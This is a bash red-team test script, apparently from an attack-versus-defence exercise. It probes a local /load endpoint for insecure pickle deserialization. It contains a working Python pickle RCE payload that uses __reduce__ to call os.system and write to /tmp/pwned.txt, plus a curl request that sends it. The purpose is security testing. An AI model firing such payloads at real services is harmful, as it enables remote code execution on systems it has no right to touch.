#!/usr/bin/env bash
# Red team: Insecure deserialization via /load — pickle RCE
# exit 0 = pickle executed arbitrary code (RED WINS)
# exit 1 = deserialization blocked (BLUE WINS)
set -u
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-18080}"
BASE="http://${TARGET_HOST}:${TARGET_PORT}/load"
SUCCESS=1

# Generate malicious pickles via python
# Payload 1: os.system("id") — writes to a detectable file
PICKLE_ID=$(python3 -c "
import pickle, base64, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned.txt',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
" 2>/dev/null) || PICKLE_ID=""

# Payload 2: benign pickle (should always work)
PICKLE_SAFE=$(python3 -c "
import pickle, base64
print(base64.b64encode(pickle.dumps({'hello':'world'})).decode())
" 2>/dev/null) || PICKLE_SAFE=""

echo "---raw---"

# Test malicious pickle
if [ -n "$PICKLE_ID" ]; then
  resp=$(curl -sS --max-time 4 -X POST "$BASE" --data-urlencode "data=$PICKLE_ID" 2>&1) || true
  echo "MALICIOUS_PICKLE response: ${resp:0:300}"
  if echo "$resp" | grep -qF 'CANARY_DESER_9a1f7b'; then
    echo "PICKLE_RCE: canary found in deserialization response"
    SUCCESS=0
  elif echo "$resp" | grep -qE '"type":\s*"int"|"value":\s*"0"'; then
    echo "PICKLE_RCE: os.system returned 0 (command executed)"
    SUCCESS=0
  fi
fi

# Test safe pickle (should work)
if [ -n "$PICKLE_SAFE" ]; then
  resp=$(curl -sS --max-time 4 -X POST "$BASE" --data-urlencode "data=$PICKLE_SAFE" 2>&1) || true
  echo "SAFE_PICKLE response: ${resp:0:200}"
fi

echo "---/raw---"

if [ "$SUCCESS" -eq 0 ]; then
  echo "EVIDENCE: insecure deserialization RCE succeeded via /load"
  exit 0
fi
echo "EVIDENCE: deserialization attack blocked or failed"
exit 1
